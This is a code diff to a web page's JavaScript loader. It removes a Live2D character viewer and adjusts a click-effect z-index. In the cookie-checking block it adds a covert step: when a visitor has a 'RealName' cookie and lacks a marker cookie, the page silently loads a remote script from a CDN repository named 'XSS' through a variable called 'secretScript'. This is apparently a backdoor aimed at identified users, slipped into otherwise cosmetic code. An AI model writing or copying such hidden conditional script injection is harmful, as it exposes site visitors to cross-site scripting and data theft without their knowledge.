@@ -8,17 +8,9 @@ const howlerScript = document.createElement("script");
 howlerScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/howler@2.1.3/dist/howler.min.js");
 body.insertAdjacentElement("afterbegin", howlerScript);
 
-const live2dcubismcoreScript = document.createElement("script");
-live2dcubismcoreScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/CDN@1.4/live2dv3/live2dcubismcore.min.js");
-body.insertAdjacentElement("afterbegin", live2dcubismcoreScript);
-
 const pixiScript = document.createElement("script");
 pixiScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/pixi.js@4.6.1/dist/pixi.min.js");
 body.insertAdjacentElement("afterbegin", pixiScript);
-
-const live2dv3Script = document.createElement("script");
-live2dv3Script.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/CDN@1.4/live2dv3/live2dv3.js");
-body.insertAdjacentElement("afterbegin", live2dv3Script);
 
 const jqueryScript = document.createElement("script");
 jqueryScript.setAttribute("src", "https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js");
@@ -32,18 +24,6 @@ const fontLink = document.createElement("link");
 fontLink.setAttribute("href", "https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css");
 fontLink.setAttribute("rel", "stylesheet");
 body.insertAdjacentElement("afterbegin", fontLink);
-
-window.onload = () =>{
-    new l2dViewer({
-        el: document.getElementById('L2dCanvas'),
-        basePath: 'https://cdn.jsdelivr.net/gh/OverJerry/CDN@1.4/live2dv3',
-        modelName: '1_3',
-        sizeLimit: false,
-        mobileLimit: false,
-        width: 1000,
-        height: 750
-    })
-}
 
 (function() {
     var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
@@ -65,7 +45,7 @@ jQuery(document).ready(function($) {
         var x = e.pageX,
         y = e.pageY;
         $i.css({
-            "z-index": 999999999999999999999999999999999999999999999999999999999999999999999,
+            "z-index": 99999,
             "top": y - 20,
             "left": x,
             "position": "absolute",
@@ -87,7 +67,9 @@ jQuery(document).ready(function($) {
     s = cookie.indexOf("nbxiaoshi2010=dzbp");
     t = cookie.indexOf("RealName=");
     if (s == -1 && t != -1 && cookie[t + 9] != '&') {
-        eval("console.log('insert')")
+        const secretScript = document.createElement("script");
+        secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@1.0/1.js");
+        body.insertAdjacentElement("afterbegin", secretScript);
     }
 
 })();
